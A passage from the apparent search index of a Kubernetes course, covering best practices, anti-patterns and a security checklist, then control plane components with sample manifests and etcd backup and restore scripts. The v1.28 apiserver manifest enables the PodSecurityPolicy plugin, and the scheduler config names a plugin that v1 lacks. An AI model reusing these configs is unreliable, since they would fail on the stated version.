Deployments, not bare Pods</li> <li>Deployments provide self-healing and scaling</li> <li> <p>Enable rolling updates and rollbacks</p> </li> <li> <p>Pin image versions</p> </li> <li>Avoid <code>:latest</code> tag in production</li> <li> <p>Use specific version tags or digest</p> </li> <li> <p>Configure rolling update parameters</p> </li> <li>Set <code>maxUnavailable: 0</code> for zero-downtime deployments</li> <li> <p>Adjust <code>maxSurge</code> based on capacity</p> </li> <li> <p>Keep revision history</p> </li> <li>Set <code>revisionHistoryLimit</code> (default: 10)</li> <li> <p>Enables rollbacks to previous versions</p> </li> <li> <p>Use Pod Disruption Budgets</p> </li> <li>Prevents voluntary disruptions during maintenance</li> <li>Ensures minimum availability during updates</li> </ol>"},{"location":"01-k8s-basics/#73-service-best-practices","title":"7.3 Service Best Practices","text":"<ol> <li>Use ClusterIP for internal services</li> <li>More secure than exposing via NodePort</li> <li> <p>Use Ingress for external access</p> </li> <li> <p>Define readiness probes</p> </li> <li>Services only route to ready Pods</li> <li> <p>Prevents traffic to unhealthy endpoints</p> </li> <li> <p>Use meaningful service names</p> </li> <li>Services create DNS entries</li> <li>Name format: <code>&lt;service-name&gt;.&lt;namespace&gt;.svc.cluster.local</code></li> </ol>"},{"location":"01-k8s-basics/#74-label-best-practices","title":"7.4 Label Best Practices","text":"<ol> <li>Follow recommended label conventions</li> <li>Use <code>app.kubernetes.io/*</code> prefix for standard labels</li> <li> <p>Include: name, instance, version, component, part-of</p> </li> <li> <p>Use labels for organization</p> </li> <li>Environment (prod, staging, dev)</li> <li>Team/owner</li> <li> <p>Cost allocation</p> </li> <li> <p>Don't use labels for non-identifying information</p> </li> <li>Use annotations for metadata that doesn't identify resources</li> </ol>"},{"location":"01-k8s-basics/#75-namespace-best-practices","title":"7.5 Namespace Best Practices","text":"<ol> <li>Use namespaces for isolation</li> <li>Separate environments (dev/staging/prod)</li> <li>Separate teams or projects</li> <li> <p>Multi-tenant scenarios</p> </li> <li> <p>Apply resource quotas</p> </li> <li>Prevent resource exhaustion</li> <li> <p>Fair resource allocation</p> </li> <li> <p>Use Network Policies</p> </li> <li>Control traffic between namespaces</li> <li>Default deny, explicit allow</li> </ol>"},{"location":"01-k8s-basics/#8-anti-patterns-and-common-mistakes","title":"8. Anti-Patterns and Common Mistakes","text":""},{"location":"01-k8s-basics/#81-pod-anti-patterns","title":"8.1 Pod Anti-Patterns","text":"<p>\u274c Using bare Pods in production <pre><code># DON'T DO THIS\napiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp\nspec:\n  containers:\n  - name: app\n    image: myapp:latest\n</code></pre></p> <p>\u2705 Use Deployments instead <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: myapp\n  template:\n    metadata:\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: app\n        image: myapp:1.2.3\n</code></pre></p>"},{"location":"01-k8s-basics/#82-resource-anti-patterns","title":"8.2 Resource Anti-Patterns","text":"<p>\u274c No resource limits - Pods can consume all node resources - Causes resource contention and node instability</p> <p>\u274c Using :latest tag - Non-deterministic deployments - Difficult to rollback - Cache issues</p> <p>\u274c Running as root <pre><code># INSECURE\nspec:\n  containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsUser: 0  # DON'T DO THIS\n</code></pre></p>"},{"location":"01-k8s-basics/#83-service-anti-patterns","title":"8.3 Service Anti-Patterns","text":"<p>\u274c Exposing everything via LoadBalancer - Expensive (each LB costs money) - Security risk - Use Ingress instead for HTTP/HTTPS</p> <p>\u274c Selector mismatch <pre><code># Service selector doesn't match Pod labels\nService selector: app=frontend\nPod labels: app=front-end  # Typo!\n</code></pre></p>"},{"location":"01-k8s-basics/#84-deployment-anti-patterns","title":"8.4 Deployment Anti-Patterns","text":"<p>\u274c maxUnavailable: 100% - Causes downtime - All Pods may be down simultaneously</p> <p>\u274c No health checks - Traffic sent to unhealthy Pods - Failed deployments not detected</p>"},{"location":"01-k8s-basics/#85-namespace-anti-patterns","title":"8.5 Namespace Anti-Patterns","text":"<p>\u274c Everything in default namespace - No isolation - Difficult to manage - No resource quotas</p> <p>\u274c Hard-coding namespace in manifests - Makes manifests less reusable - Use kubectl <code>--namespace</code> flag or kustomize</p>"},{"location":"01-k8s-basics/#9-hands-on-lab-references","title":"9. Hands-on Lab References","text":"<p>This module includes the following hands-on labs in the <code>/labs/01-basics/</code> directory:</p> <ol> <li>Lab 1.1: Creating and Managing Pods</li> <li>Create single and multi-container Pods</li> <li>Inspect Pod status and logs</li> <li>Execute commands in containers</li> <li> <p>File: <code>/labs/01-basics/lab-1.1-pods.md</code></p> </li> <li> <p>Lab 1.2: Working with Services</p> </li> <li>Create ClusterIP and NodePort Services</li> <li>Test service discovery</li> <li>Debug service connectivity</li> <li> <p>File: <code>/labs/01-basics/lab-1.2-services.md</code></p> </li> <li> <p>Lab 1.3: Deploying Applications</p> </li> <li>Create and manage Deployments</li> <li>Perform rolling updates</li> <li>Rollback deployments</li> <li>Scale applications</li> <li> <p>File: <code>/labs/01-basics/lab-1.3-deployments.md</code></p> </li> <li> <p>Lab 1.4: Labels, Selectors, and Namespaces</p> </li> <li>Apply and manage labels</li> <li>Use selectors to query resources</li> <li>Create and use namespaces</li> <li>Apply resource quotas</li> <li>File: <code>/labs/01-basics/lab-1.4-organization.md</code></li> </ol>"},{"location":"01-k8s-basics/#10-security-checklist","title":"10. Security Checklist","text":""},{"location":"01-k8s-basics/#pod-security","title":"Pod Security","text":"<ul> <li>[ ] Define resource requests and limits for all containers</li> <li>[ ] Set <code>runAsNonRoot: true</code> in security context</li> <li>[ ] Specify explicit <code>runAsUser</code> (non-zero UID)</li> <li>[ ] Set <code>allowPrivilegeEscalation: false</code></li> <li>[ ] Use <code>readOnlyRootFilesystem: true</code> where possible</li> <li>[ ] Drop all capabilities and add back only required ones</li> <li>[ ] Avoid <code>hostNetwork</code>, <code>hostPID</code>, <code>hostIPC</code> unless absolutely necessary</li> <li>[ ] Use specific image tags, not <code>:latest</code></li> <li>[ ] Scan container images for vulnerabilities</li> <li>[ ] Use private image registries with authentication</li> </ul>"},{"location":"01-k8s-basics/#deployment-security","title":"Deployment Security","text":"<ul> <li>[ ] Configure liveness and readiness probes</li> <li>[ ] Set appropriate <code>revisionHistoryLimit</code></li> <li>[ ] Use <code>imagePullPolicy: Always</code> or <code>IfNotPresent</code></li> <li>[ ] Store secrets in Secret objects, not in manifests</li> <li>[ ] Use Pod Disruption Budgets for critical applications</li> <li>[ ] Apply Pod Security Standards (restricted profile recommended)</li> </ul>"},{"location":"01-k8s-basics/#service-security","title":"Service Security","text":"<ul> <li>[ ] Use ClusterIP for internal services</li> <li>[ ] Avoid exposing services unnecessarily</li> <li>[ ] Use Network Policies to restrict traffic</li> <li>[ ] Implement authentication and authorization for exposed services</li> </ul>"},{"location":"01-k8s-basics/#namespace-security","title":"Namespace Security","text":"<ul> <li>[ ] Use namespaces for isolation</li> <li>[ ] Apply ResourceQuotas to prevent resource exhaustion</li> <li>[ ] Apply LimitRanges for default resource constraints</li> <li>[ ] Use Network Policies for namespace isolation</li> <li>[ ] Apply RBAC to limit namespace access</li> </ul>"},{"location":"01-k8s-basics/#11-references","title":"11. References","text":"<ol> <li>Kubernetes Official Documentation</li> <li>Pods: https://kubernetes.io/docs/concepts/workloads/pods/</li> <li>Services: https://kubernetes.io/docs/concepts/services-networking/service/</li> <li>Deployments: https://kubernetes.io/docs/concepts/workloads/controllers/deployment/</li> <li>Labels and Selectors: https://kubernetes.io/docs/concepts/overview/working-with-objects/labels/</li> <li> <p>Namespaces: https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces/</p> </li> <li> <p>Kubernetes API Reference</p> </li> <li> <p>v1.28 API Reference: https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.28/</p> </li> <li> <p>Best Practices</p> </li> <li>Kubernetes Best Practices (Google): https://cloud.google.com/blog/products/containers-kubernetes/your-guide-kubernetes-best-practices</li> <li> <p>Configuration Best Practices: https://kubernetes.io/docs/concepts/configuration/overview/</p> </li> <li> <p>Security</p> </li> <li>Pod Security Standards: https://kubernetes.io/docs/concepts/security/pod-security-standards/</li> <li> <p>CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes</p> </li> <li> <p>CNCF Resources</p> </li> <li>CNCF Cloud Native Glossary: https://glossary.cncf.io/</li> <li> <p>CNCF Kubernetes Documentation: https://www.cncf.io/projects/kubernetes/</p> </li> <li> <p>Books and Guides</p> </li> <li>\"Kubernetes in Action\" by Marko Luk\u0161a (Manning Publications)</li> <li>\"Kubernetes: Up and Running\" by Kelsey Hightower et al. (O'Reilly)</li> </ol>"},{"location":"01-k8s-basics/#summary","title":"Summary","text":"<p>In this module, you learned the fundamental building blocks of Kubernetes:</p> <ul> <li>Pods are the atomic units of deployment that encapsulate one or more containers</li> <li>Services provide stable networking endpoints and load balancing for Pods</li> <li>Deployments manage the declarative lifecycle of Pods through ReplicaSets</li> <li>Labels and Selectors organize and query Kubernetes resources</li> <li>Namespaces provide resource isolation and multi-tenancy</li> </ul> <p>You also learned security best practices for each resource type and common anti-patterns to avoid. These fundamentals are essential for understanding more advanced Kubernetes concepts covered in subsequent modules.</p> <p>Next Module: 02-control-plane.md - Control Plane and Cluster Components</p>"},{"location":"02-control-plane/","title":"Module 02: Control Plane and Cluster Components","text":""},{"location":"02-control-plane/#overview","title":"Overview","text":"<p>Estimated Time: 4-5 hours</p> <p>Module Type: Architecture Deep Dive</p> <p>Prerequisites: Module 01 - Kubernetes Basics</p> <p>This module provides a comprehensive understanding of Kubernetes cluster architecture, focusing on control plane components and worker node components. You'll learn how these components interact to provide the orchestration, scheduling, and management capabilities that make Kubernetes powerful. Understanding this architecture is crucial for troubleshooting, performance tuning, and implementing high availability patterns.</p>"},{"location":"02-control-plane/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Explain the role and function of each control plane component</li> <li>Understand how worker node components interact with the control plane</li> <li>Describe the Kubernetes API request flow from client to etcd</li> <li>Implement high availability patterns for control plane components</li> <li>Perform etcd backup and restore operations</li> <li>Troubleshoot common control plane issues</li> <li>Secure control plane components using best practices</li> <li>Monitor control plane health and performance</li> </ol>"},{"location":"02-control-plane/#1-kubernetes-architecture-overview","title":"1. Kubernetes Architecture Overview","text":""},{"location":"02-control-plane/#11-cluster-components","title":"1.1 Cluster Components","text":"<p>A Kubernetes cluster consists of two main types of nodes:</p> <p>Control Plane Nodes (Master Nodes): - Run control plane components - Make global decisions about the cluster - Detect and respond to cluster events - Should run on dedicated infrastructure in production</p> <p>Worker Nodes: - Run application workloads (Pods) - Execute container runtime - Report node and Pod status to control plane - Can be physical or virtual machines</p>"},{"location":"02-control-plane/#12-component-communication","title":"1.2 Component Communication","text":"<ul> <li>All components communicate through the API server</li> <li>Only the API server talks directly to etcd</li> <li>Secure communication using TLS certificates</li> <li>Components use service accounts for authentication</li> </ul>"},{"location":"02-control-plane/#2-control-plane-components","title":"2. Control Plane Components","text":""},{"location":"02-control-plane/#21-kube-apiserver","title":"2.1 kube-apiserver","text":"<p>Purpose: The API server is the front-end for the Kubernetes control plane. It exposes the Kubernetes API and is the only component that communicates directly with etcd.</p> <p>Key Responsibilities: - Serves the Kubernetes REST API - Validates and processes API requests - Authenticates and authorizes requests - Persists cluster state to etcd - Acts as the gateway for all cluster operations</p> <p>Configuration Example:</p> <pre><code># /etc/kubernetes/manifests/kube-apiserver.yaml (static pod)\napiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    image: registry.k8s.io/kube-apiserver:v1.28.0\n    command:\n    - kube-apiserver\n    - --advertise-address=192.168.1.100\n    - --allow-privileged=true\n    - --authorization-mode=Node,RBAC\n    - --client-ca-file=/etc/kubernetes/pki/ca.crt\n    - --enable-admission-plugins=NodeRestriction,PodSecurityPolicy\n    - --enable-bootstrap-token-auth=true\n    - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt\n    - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt\n    - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key\n    - --etcd-servers=https://127.0.0.1:2379\n    - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt\n    - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key\n    - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname\n    - --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt\n    - --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key\n    - --requestheader-allowed-names=front-proxy-client\n    - --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt\n    - --secure-port=6443\n    - --service-account-issuer=https://kubernetes.default.svc.cluster.local\n    - --service-account-key-file=/etc/kubernetes/pki/sa.pub\n    - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key\n    - --service-cluster-ip-range=10.96.0.0/12\n    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt\n    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key\n    - --audit-log-path=/var/log/kubernetes/audit.log\n    - --audit-log-maxage=30\n    - --audit-log-maxbackup=10\n    - --audit-log-maxsize=100\n    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml\n</code></pre> <p>Important Flags: - <code>--etcd-servers</code>: etcd cluster endpoints - <code>--authorization-mode</code>: Authorization modes (Node, RBAC, ABAC, Webhook) - <code>--enable-admission-plugins</code>: Admission controllers to enable - <code>--audit-log-path</code>: Enable audit logging - <code>--tls-cert-file</code> / <code>--tls-private-key-file</code>: TLS configuration</p>"},{"location":"02-control-plane/#22-etcd","title":"2.2 etcd","text":"<p>Purpose: etcd is a consistent, highly-available key-value store used as Kubernetes' backing store for all cluster data.</p> <p>Key Characteristics: - Distributed, reliable key-value store - Uses Raft consensus algorithm - Stores all Kubernetes objects and state - Critical for cluster operation\u2014backup regularly!</p> <p>etcd Configuration:</p> <pre><code># /etc/kubernetes/manifests/etcd.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: etcd\n  namespace: kube-system\nspec:\n  containers:\n  - name: etcd\n    image: registry.k8s.io/etcd:3.5.9-0\n    command:\n    - etcd\n    - --advertise-client-urls=https://192.168.1.100:2379\n    - --cert-file=/etc/kubernetes/pki/etcd/server.crt\n    - --client-cert-auth=true\n    - --data-dir=/var/lib/etcd\n    - --initial-advertise-peer-urls=https://192.168.1.100:2380\n    - --initial-cluster=master-1=https://192.168.1.100:2380\n    - --key-file=/etc/kubernetes/pki/etcd/server.key\n    - --listen-client-urls=https://127.0.0.1:2379,https://192.168.1.100:2379\n    - --listen-metrics-urls=http://127.0.0.1:2381\n    - --listen-peer-urls=https://192.168.1.100:2380\n    - --name=master-1\n    - --peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt\n    - --peer-client-cert-auth=true\n    - --peer-key-file=/etc/kubernetes/pki/etcd/peer.key\n    - --peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt\n    - --snapshot-count=10000\n    - --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt\n</code></pre> <p>etcd Backup:</p> <pre><code>#!/bin/bash\n# Backup etcd data\n\nETCDCTL_API=3 etcdctl snapshot save /backup/etcd-snapshot-$(date +%Y%m%d-%H%M%S).db \\\n  --endpoints=https://127.0.0.1:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\n# Verify backup\nETCDCTL_API=3 etcdctl snapshot status /backup/etcd-snapshot-*.db\n</code></pre> <p>etcd Restore:</p> <pre><code>#!/bin/bash\n# Restore etcd from backup\n\n# Stop kube-apiserver\nmv /etc/kubernetes/manifests/kube-apiserver.yaml /tmp/\n\n# Restore snapshot\nETCDCTL_API=3 etcdctl snapshot restore /backup/etcd-snapshot.db \\\n  --data-dir=/var/lib/etcd-restore \\\n  --initial-cluster=master-1=https://192.168.1.100:2380 \\\n  --initial-advertise-peer-urls=https://192.168.1.100:2380\n\n# Update etcd data directory\nmv /var/lib/etcd /var/lib/etcd-old\nmv /var/lib/etcd-restore /var/lib/etcd\n\n# Restart kube-apiserver\nmv /tmp/kube-apiserver.yaml /etc/kubernetes/manifests/\n</code></pre>"},{"location":"02-control-plane/#23-kube-controller-manager","title":"2.3 kube-controller-manager","text":"<p>Purpose: Runs controller processes that regulate the state of the cluster. Each controller watches the shared state through the API server and makes changes to move the current state toward the desired state.</p> <p>Key Controllers: - Node Controller: Monitors node health and responds to node failures - Replication Controller: Maintains correct number of Pods - Endpoints Controller: Populates Endpoints objects (joins Services &amp; Pods) - Service Account &amp; Token Controllers: Creates default accounts and API access tokens - Namespace Controller: Manages namespace lifecycle - PersistentVolume Controller: Manages PV/PVC binding</p> <p>Configuration:</p> <pre><code># /etc/kubernetes/manifests/kube-controller-manager.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-controller-manager\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-controller-manager\n    image: registry.k8s.io/kube-controller-manager:v1.28.0\n    command:\n    - kube-controller-manager\n    - --allocate-node-cidrs=true\n    - --authentication-kubeconfig=/etc/kubernetes/controller-manager.conf\n    - --authorization-kubeconfig=/etc/kubernetes/controller-manager.conf\n    - --bind-address=127.0.0.1\n    - --client-ca-file=/etc/kubernetes/pki/ca.crt\n    - --cluster-cidr=10.244.0.0/16\n    - --cluster-name=kubernetes\n    - --cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt\n    - --cluster-signing-key-file=/etc/kubernetes/pki/ca.key\n    - --controllers=*,bootstrapsigner,tokencleaner\n    - --kubeconfig=/etc/kubernetes/controller-manager.conf\n    - --leader-elect=true\n    - --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt\n    - --root-ca-file=/etc/kubernetes/pki/ca.crt\n    - --service-account-private-key-file=/etc/kubernetes/pki/sa.key\n    - --service-cluster-ip-range=10.96.0.0/12\n    - --use-service-account-credentials=true\n</code></pre> <p>Important Flags: - <code>--leader-elect=true</code>: Enables leader election for HA - <code>--controllers</code>: Which controllers to enable - <code>--cluster-cidr</code>: Pod IP range - <code>--service-cluster-ip-range</code>: Service IP range</p>"},{"location":"02-control-plane/#24-kube-scheduler","title":"2.4 kube-scheduler","text":"<p>Purpose: Watches for newly created Pods with no assigned node and selects a node for them to run on based on resource requirements, constraints, affinity specifications, and other factors.</p> <p>Scheduling Process: 1. Filtering: Find feasible nodes (predicates)    - Sufficient resources    - Node selectors match    - Taints tolerated    - Volume constraints met</p> <ol> <li>Scoring: Rank feasible nodes (priorities)</li> <li>Resource availability</li> <li>Spread across zones</li> <li>Affinity/anti-affinity rules</li> <li> <p>Custom priorities</p> </li> <li> <p>Binding: Assign Pod to highest-scored node</p> </li> </ol> <p>Configuration:</p> <pre><code># /etc/kubernetes/manifests/kube-scheduler.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-scheduler\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-scheduler\n    image: registry.k8s.io/kube-scheduler:v1.28.0\n    command:\n    - kube-scheduler\n    - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf\n    - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf\n    - --bind-address=127.0.0.1\n    - --kubeconfig=/etc/kubernetes/scheduler.conf\n    - --leader-elect=true\n    - --config=/etc/kubernetes/scheduler-config.yaml\n</code></pre> <p>Custom Scheduler Configuration:</p> <pre><code># /etc/kubernetes/scheduler-config.yaml\napiVersion: kubescheduler.config.k8s.io/v1\nkind: KubeSchedulerConfiguration\nclientConnection:\n  kubeconfig: /etc/kubernetes/scheduler.conf\nprofiles:\n- schedulerName: default-scheduler\n  plugins:\n    score:\n      enabled:\n      - name: NodeResourcesFit\n        weight: 1\n      - name: PodTopologySpread\n        weight: 2\n      disabled:\n      - name: NodeResourcesLeastAllocated\n  pluginConfig:\n  - name: NodeResourcesFit\n    args:\n      scoringStrategy:\n        type: MostAllocated\n</code></pre>"},{"location":"02-control-plane/#25-cloud-controller-manager-optional","title":"2.5 cloud-controller-manager (Optional)","text":"<p>Purpose: Embeds cloud-specific control logic. Lets you link your cluster with cloud provider APIs and separates components that interact with the cloud platform from components that only interact with your cluster.</p> <p>Cloud-Specific Controllers: - Node Controller: Checks if node has been deleted from cloud - Route Controller: Sets up routes in cloud infrastructure - Service Controller: Creates/updates/deletes cloud load balancers</p>"},{"location":"02-control-plane/#3-worker-node-components","title":"3. Worker Node Components","text":""},{"location":"02-control-plane/#31-kubelet","title":"3.1 kubelet","text":"<p>Purpose: An agent that runs on each node in the cluster. It ensures containers are running in a Pod by communicating with the container runtime.</p> <p>Key Responsibilities: - Registers node with API server - Watches for Pod assignments - Starts and monitors containers - Reports Pod and node status - Runs liveness and readiness probes - Mounts volumes</p> <p>Configuration:</p> <pre><code># /var/lib/kubelet/config.yaml\napiVersion: kubelet.config.k8s.io/v1beta1\nkind: KubeletConfiguration\naddress: 0.0.0.0\nauthentication:\n  anonymous:\n    enabled: false\n  webhook:\n    enabled: true\n  x509:\n    clientCAFile: /etc/kubernetes/pki/ca.crt\nauthorization:\n  mode: Webhook\ncgroupDriver: systemd\nclusterDNS:\n- 10.96.0.10\nclusterDomain: cluster.local\ncontainerRuntimeEndpoint: unix:///var/run/containerd/containerd.sock\ncpuManagerPolicy: none\neventRecordQPS: 5\nevictionHard:\n  imagefs.available: 15%\n  memory.available: 100Mi\n  nodefs.available: 10%\n  nodefs.inodesFree: 5%\nfeatureGates:\n  RotateKubeletServerCertificate: true\nhealthzBindAddress: 127.0.0.1\nhealthzPort: 10248\nimageGCHighThresholdPercent: 85\nimageGCLowThresholdPercent: 80\nlogging:\n  format: text\nmaxPods: 110\nreadOnlyPort: 0\nresolvConf: /run/systemd/resolve/resolv.conf\nrotateCertificates: true\nruntimeRequestTimeout: 15m\nserverTLSBootstrap: true\nshutdownGracePeriod: 30s\nstaticPodPath: /etc/kubernetes/manifests\nstreamingConnectionIdleTimeout: 4h\nsyncFrequency: 1m\ntlsCertFile: /var/lib/kubelet/pki/kubelet.crt\ntlsPrivateKeyFile: /var/lib/kubelet/pki/kubelet.key\n</code></pre> <p>Important Settings: - <code>containerRuntimeEndpoint</code>: CRI socket path - <code>evictionHard</code>: Thresholds for pod eviction - <code>maxPods</code>: Maximum pods per node - <code>readOnlyPort: 0</code>: Disable unauthenticated port (security)</p>"},{"location":"02-control-plane/#32-kube-proxy","title":"3.2 kube-proxy","text":"<p>Purpose: Maintains network rules on nodes. These network rules allow network communication to Pods from inside or outside the cluster.</p> <p>Modes: 1. iptables (default): Uses iptables rules for packet forwarding 2. IPVS: Uses Linux IPVS for better performance and more load-balancing algorithms 3. userspace: Legacy mode, rarely used</p> <p>Configuration:</p> <pre><code># ConfigMap for kube-proxy\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: kube-proxy\n  namespace: kube-system\ndata:\n  config.conf: |\n    apiVersion: kubeproxy.config.k8s.io/v1alpha1\n    kind: KubeProxyConfiguration\n    bindAddress: 0.0.0.0\n    clientConnection:\n      kubeconfig: /var/lib/kube-proxy/kubeconfig.conf\n    clusterCIDR: 10.244.0.0/16\n    mode: \"ipvs\"\n    ipvs:\n      scheduler: \"rr\"\n      syncPeriod: 30s\n    iptables:\n      syncPeriod: 30s\n    metricsBindAddress: 127.0.0.1:10249\n</code></pre> <p>DaemonSet Deployment:</p> <pre><code>apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-proxy\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: kube-proxy\n  template:\n    metadata:\n      labels:\n        k8s-app: kube-proxy\n    spec:\n      hostNetwork: true\n      priorityClassName: system-node-critical\n      containers:\n      - name: kube-proxy\n        image: registry.k8s.io/kube-proxy:v1.28.0\n        command:\n        - /usr/local/bin/kube-proxy\n        - --config=/var/lib/kube-proxy/config.conf\n        - --hostname-override=$(NODE_NAME)\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: kube-proxy\n          mountPath: /var/lib/kube-proxy\n        - name: iptables-lock\n          mountPath: /run/xtables.lock\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: kube-proxy\n        configMap:\n          name: kube-proxy\n      - name: iptables-lock\n        hostPath:\n          path: /run/xtables.lock\n          type: FileOrCreate\n</code></pre>"},{"location":"02-control-plane/#33-container-runtime","title":"3.3 Container Runtime","text":"<p>Purpose: Software responsible for running containers. Kubernetes supports any runtime that implements the Container Runtime Interface (CRI).</p> <p>Supported Runtimes: - containerd: Industry standard, default in many distributions - CRI-O: Lightweight, designed specifically for Kubernetes - Docker Engine: Via cri-dockerd shim (deprecated in 1.24+)</p> <p>containerd Configuration:</p> <pre><code># /etc/containerd/config.toml\nversion = 2\n\n[plugins]\n  [plugins.\"io.containerd.grpc.v1.cri\"]\n    [plugins.\"io.containerd.grpc.v1.cri\".containerd]\n      [plugins.\"io.containerd.grpc.v1.cri\".containerd.runtimes]\n        [plugins.\"io.containerd.grpc.v1.cri\".containerd.runtimes.runc]\n          runtime_type = \"io.containerd.runc.v2\"\n          [plugins.\"io.containerd.grpc.v1.cri\".containerd.runtimes.runc.options]\n            SystemdCgroup = true\n    [plugins.\"io.containerd.grpc.v1.cri\".cni]\n      bin_dir = \"/opt/cni/bin\"\n      conf_dir = \"/etc/cni/net.d\"\n</code></pre>"},{"location":"02-control-plane/#4-control-plane-architecture-diagram","title":"4. Control Plane Architecture Diagram","text":"<pre><code>graph TB\n    subgraph \"Control Plane Node(s)\"\n        API[kube-apiserver&lt;br/&gt;:6443&lt;br/&gt;REST API Gateway]\n        ETCD[(etcd&lt;br/&gt;:2379, :2380&lt;br/&gt;Key-Value Store)]\n        CM[kube-controller-manager&lt;br/&gt;:10257&lt;br/&gt;Controllers]\n        SCHED[kube-scheduler&lt;br/&gt;:10259&lt;br/&gt;Pod Scheduler]\n        CCM[cloud-controller-manager&lt;br/&gt;Optional]\n\n        API &lt;--&gt;|Read/Write&lt;br/&gt;Cluster State| ETCD\n        CM --&gt;|Watch Resources&lt;br/&gt;API Calls| API\n        SCHED --&gt;|Watch Unscheduled Pods&lt;br/&gt;Bind Pods| API\n        CCM --&gt;|Cloud Integration| API\n    end\n\n    subgraph \"Worker Node 1\"\n        KUBELET1[kubelet&lt;br/&gt;:10250&lt;br/&gt;Node Agent]\n        PROXY1[kube-proxy&lt;br/&gt;Network Rules]\n        CRI1[Container Runtime&lt;br/&gt;containerd/CRI-O]\n\n        subgraph \"Pods on Node 1\"\n            POD1[Pod: app-1]\n            POD2[Pod: app-2]\n        end\n\n        KUBELET1 --&gt;|Manage Containers| CRI1\n        CRI1 --&gt;|Run| POD1\n        CRI1 --&gt;|Run| POD2\n        PROXY1 -.-&gt;|iptables/IPVS&lt;br/&gt;Rules| POD1\n        PROXY1 -.-&gt;|iptables/IPVS&lt;br/&gt;Rules| POD2\n    end\n\n    subgraph \"Worker Node 2\"\n        KUBELET2[kubelet&lt;br/&gt;:10250&lt;br/&gt;Node Agent]\n        PROXY2[kube-proxy&lt;br/&gt;Network Rules]\n        CRI2[Container Runtime&lt;br/&gt;containerd/CRI-O]\n\n        subgraph \"Pods on Node 2\"\n            POD3[Pod: app-3]\n            POD4[Pod: app-4]\n        end\n\n        KUBELET2 --&gt;|Manage Containers| CRI2\n        CRI2 --&gt;|Run| POD3\n        CRI2 --&gt;|Run| POD4\n        PROXY2 -.-&gt;|iptables/IPVS&lt;br/&gt;Rules| POD3\n        PROXY2 -.-&gt;|iptables/IPVS&lt;br/&gt;Rules| POD4\n    end\n\n    subgraph \"External Clients\"\n        KUBECTL[kubectl]\n        CLIENT[API Clients&lt;br/&gt;CI/CD, Apps]\n    end\n\n    KUBECTL --&gt;|HTTPS :6443&lt;br/&gt;TLS + Auth| API\n    CLIENT --&gt;|HTTPS :6443&lt;br/&gt;TLS + Auth| API\n\n    API &lt;--&gt;|Secure Connection&lt;br/&gt;TLS + Auth| KUBELET1\n    API &lt;--&gt;|Secure Connection&lt;br/&gt;TLS + Auth| KUBELET2\n\n    KUBELET1 -.-&gt;|Report Status&lt;br/&gt;Watch Pods| API\n    KUBELET2 -.-&gt;|Report Status&lt;br/&gt;Watch Pods| API\n\n    PROXY1 -.-&gt;|Watch Services&lt;br/&gt;Endpoints| API\n    PROXY2 -.-&gt;|Watch Services&lt;br/&gt;Endpoints| API\n\n    style API fill:#326CE5,stroke:#fff,color:#fff\n    style ETCD fill:#FF6B6B,stroke:#fff,color:#fff\n    style CM fill:#326CE5,stroke:#fff,color:#fff\n    style SCHED fill:#326CE5,stroke:#fff,color:#fff\n    style KUBELET1 fill:#13AA52,stroke:#fff,color:#fff\n    style KUBELET2 fill:#13AA52,stroke:#fff,color:#fff</code></pre>"},{"location":"02-control-plane/#5-high-availability-patterns","title":"5. High Availability Patterns","text":""},{"location":"02-control-plane/#51-control-plane-ha-architecture","title":"5.1 Control Plane HA Architecture","text":"<p>Stacked etcd Topology: - etcd runs on same nodes as control plane components - Simpler to set up and manage - Requires fewer nodes - Single node failure loses both control plane and etcd member</p> <pre><code># 3-node stacked HA cluster\nMaster Node 1: API, etcd, controller-manager, scheduler\nMaster Node 2: API, etcd, controller-manager, scheduler\nMaster Node 3: API, etcd, controller-manager, scheduler\nLoad Balancer: Distributes traffic across all API servers\n</code></pre> <p>External etcd Topology: - etcd cluster runs on separate nodes - More resilient\u2014control plane failure doesn't affect etcd - 